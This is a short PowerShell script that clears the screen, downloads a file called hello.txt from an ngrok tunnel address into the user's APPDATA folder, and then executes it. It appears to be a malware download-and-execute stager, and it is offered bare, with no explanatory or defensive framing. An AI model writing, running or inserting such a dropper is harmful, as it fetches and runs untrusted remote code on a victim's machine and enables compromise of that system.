$ProcName = "hello.txt"
$WebFile = "http://3115-8-20-101-109.ngrok.io/$ProcName"
 
Clear-Host
 
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName")
Start-Process ("$env:APPDATA\$ProcName")
